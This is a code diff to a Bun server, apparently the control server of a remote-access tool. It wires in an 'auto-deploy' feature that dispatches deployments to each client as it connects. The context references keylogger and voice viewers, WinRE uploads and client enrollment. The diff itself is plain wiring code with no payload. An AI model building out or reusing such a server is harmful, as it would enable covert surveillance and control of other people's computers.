@@ -38,6 +38,8 @@ import { CORS_HEADERS } from "./server/http-security";
 import { mimeType, secureHeaders, securePluginHeaders } from "./server/http-utils";
 import { sanitizePluginId } from "./server/plugin-utils";
 import { dispatchAutoScriptsForConnection } from "./server/auto-script-dispatch";
+import { dispatchAutoDeploysForConnection } from "./server/auto-deploy-dispatch";
+import { handleAutoDeployRoutes } from "./server/routes/auto-deploy-routes";
 import { consumeHttpDownloadPayload, type PendingHttpDownload } from "./server/http-download-consumer";
 import { startBuildProcess as runBuildProcess } from "./server/build-process";
 import { createHttpFetchHandler } from "./server/http-dispatch";
@@ -354,6 +356,10 @@ async function startServer() {
       detectUploadOs,
       normalizeClientOs,
     },
+    autoDeploy: {
+      DEPLOY_ROOT,
+      detectUploadOs,
+    },
     winre: {
       WINRE_ROOT,
       winreUploads,
@@ -476,6 +482,11 @@ async function startServer() {
     handleKeyloggerViewerMessage,
     handleVoiceViewerMessage,
     dispatchAutoScriptsForConnection,
+    dispatchAutoDeploysForConnection: (info: import("./types").ClientInfo, ws: import("bun").ServerWebSocket<SocketData>) => {
+      const proto = tls ? "https" : "http";
+      const origin = `${proto}://127.0.0.1:${PORT}`;
+      dispatchAutoDeploysForConnection(info, ws, origin);
+    },
     dispatchAutoLoadPlugins: (info: import("./types").ClientInfo) => {
       dispatchAutoLoadPlugins(
         info,
@@ -538,6 +549,7 @@ async function startServer() {
       handleAuthRoutes,
       handleNotificationsConfigRoutes,
       handleAutoScriptsRoutes,
+      handleAutoDeployRoutes,
       handleEnrollmentRoutes,
       handleUsersRoutes,
       handleBuildRoutes,
